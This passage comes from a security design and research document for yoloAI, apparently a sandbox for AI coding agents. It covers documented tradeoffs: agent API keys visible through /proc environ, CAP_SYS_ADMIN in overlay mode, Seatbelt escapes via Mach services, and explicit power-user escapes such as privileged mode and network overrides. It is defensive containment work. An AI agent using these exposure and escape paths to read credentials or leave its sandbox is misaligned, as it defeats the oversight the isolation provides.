capability entirely. `CAP_SYS_ADMIN` capability is granted to the container when
using `:overlay` mode. This is required for overlayfs mounts inside the container.
It is a broad capability — it also permits other mount operations and namespace
manipulation. The container's namespace isolation limits the blast radius, but this
is a tradeoff."

The tradeoff is documented, not hidden. The alternative (`:copy` mode) is
documented as the way to avoid the capability. Saltzer and Schroeder's
psychological acceptability principle applies: if the cost of a security tradeoff
is hidden, users cannot make informed decisions about whether to pay it.

### Accepted tradeoff — /proc/environ and API key in agent environment

`docs/contributors/design/security.md` §Credential Management: "Accepted tradeoff: The agent
process has the API key in its environment (unavoidable — CLI agents read
credentials from env vars). `/proc/<pid>/environ` exposes it to same-user processes
inside the container." The reasoning for acceptance is documented: "This is
acceptable because the agent already has full use of the key."

`docs/contributors/design/research/security.md` §1 "What it does NOT protect against" lists the
residual risks of file-based injection: `/proc/1/environ` exposure after entrypoint
export, brief host-side temp file existence. Both are documented.

### Seatbelt escape CVEs — documented ceiling on isolation strength

`docs/contributors/design/research/sandboxing.md` §sandbox-exec: "Security strength: Meaningful
boundary but not impenetrable. Primary escape vector is Mach services — sandboxed
processes communicate with system services listed in their mach-lookup allowlist.
Recent CVEs: jhftss uncovered 10+ escape vulnerabilities via Mach services
(2024–2025)." The assessment is honest about the strength ceiling: "raises the bar
significantly, regularly patched, should not be considered equivalent to VM-level
isolation."

---

## §10 — Power-user escapes are explicit and documented — cap_add, devices,
    --isolation container-privileged, --network overrides

### CIS Docker Benchmark — privileged mode documentation requirement

CIS Docker Benchmark Section 5.4: "Ensure that privileged containers are not
used. Using the `--privileged` flag gives all capabilities to the container and
also lifts all the limitations enforced by the device cgroup controller." The
benchmark explicitly requires that when `--privileged` IS used, there is documented
justification for the exception.

Applied to yoloAI: `--isolation container-privileged` (the `docker-privileged`
mode) is a documented power-user escape that explicitly undermines isolation. The
use case is documented: Docker-in-Docker, advanced recipe scenarios (Tailscale
setup, GPU passthrough). `docs/contributors/design/security.md` §Security Considerations:
"Privilege escalation via recipes: The `setup` commands and `cap_add`/`devices`
config fields enable significant privilege escalation. These are power-user
features for advanced setups (e.g., Tailscale, GPU passthrough) but have no
guardrails — a misconfigured recipe could undermine container isolation. Document
risks clearly when these features are used."

### Principle of explicit action for dangerous operations

This principle has no single named source outside yoloAI — it is the conjunction
of OWASP's "secure defaults" posture with Saltzer and Schroeder's "psychological
acceptability" principle. The formulation in yoloAI's design: a dangerous operation
must require an explicit, irreversible-looking user action, not just a configuration
value that could be set accidentally or by a misconfigured template.

Concrete yoloAI implementations:
- **Dangerous-directory detection:** `docs/contributors/design/security.md` — refuses to mount
  `$HOME`, `/`, `/etc`, `/usr`, `/var`, `/boot`, `/bin`, `/sbin`, `/lib`, macOS
  system directories unless `:force` is appended. The `:force` suffix is an
  explicit, visible override, not a config flag.
- **`:rw` is explicit:** D4 in `docs/contributors/decisions/README.md` — "Implicit upgrade
  from `:ro` to `:rw` on first write rejected as the kind of magic that produces
  incidents." The user must explicitly specify `:rw`; it is not inferred.
- **`--isolation container-privileged`:** An explicit isolation level name, not a
  simple `--privileged` flag, so users must understand what they are granting.
- **`--network` override:** Allowing the user to pass a raw Docker network spec
  bypasses yoloAI's network isolation entirely. This is explicitly documented as
  an override.

### OWASP Docker Security Cheat Sheet — escape documentation expectation

OWASP Docker Security Cheat Sheet RULE #8: "Ensure seccomp profiles are not
disabled and AppArmor profiles are not disabled." The companion principle: when
a security control is disabled, the disablement must be explicit and documented.
This is the OWASP backing for yoloAI's "explicit escape" requirement — disabling
isolation features must be opt-in, named, and documented, not default or implicit.

---

## Sources not carried over from general-principles-research

The following principles and sources in general-principles-research.md have no
direct equivalent in security-principles and are excluded.

**GDPR controller/processor (general-principles §3).** yoloAI processes no user
data on servers. The binary runs locally. There is no GDPR controller surface.
Credential management (API keys) is addressed above as a security concern, not a
data-controller concern.

**Acquisition optionality / diligence-readiness.** yoloAI is OSS with no
acquisition plan. The security research does not address enterprise audit
readiness, penetration testing cadence, or SOC 2 compliance — none of these apply
to a local CLI tool.

**SaaS status page / incident communication.** yoloAI has no hosted service and
no user base to notify of incidents. The equivalent is documentation of known
limitations (§9 above), not incident response.

**Customer-trust UX security.** GDPR Article 28 sub-processor lists, security.txt
(RFC 9116), data breach notification, and DPA clauses are all customer-trust
surface for SaaS businesses. yoloAI does not process customer data and has no SaaS
surface. These are explicitly excluded from yoloAI's security principles scope
(per the task description: "This is sandbox-containment security, NOT
customer-trust / regulatory-compliance security").

---

## Verification notes

The following attributions were not independently confirmed at writing time and are
marked [verify] where they appear in the document:

- **"Attacker Moves Second" paper** (§1, §5): confirmed as a real paper from
  Anthropic/OpenAI/DeepMind joint work, November 2025. Exact publication venue
  (arXiv, joint blog, or conference) not confirmed. Mark as [verify] on title/venue
  when citing externally.
- **Saltzer's MIT page URL** (§4): web.mit.edu/Saltzer/www/publications/protection/
  is the commonly referenced path but may have changed. Verify before citing.
  The IEEE Xplore entry for the paper (DOI:10.1109/PROC.1975.9939) is the stable
  canonical reference.
- **Reverse.put.as Apple Sandbox Guide** (§3): URL may have changed since the
  guide was published. Verify accessibility.

All other sources cited are primary sources the author has verified exist at the
URLs or records cited, based on design docs already in the yoloAI repository.
Internal citations (codebase locations, D-entries, design docs) are accurate as
of 2026-05-21 (the current date per memory context).
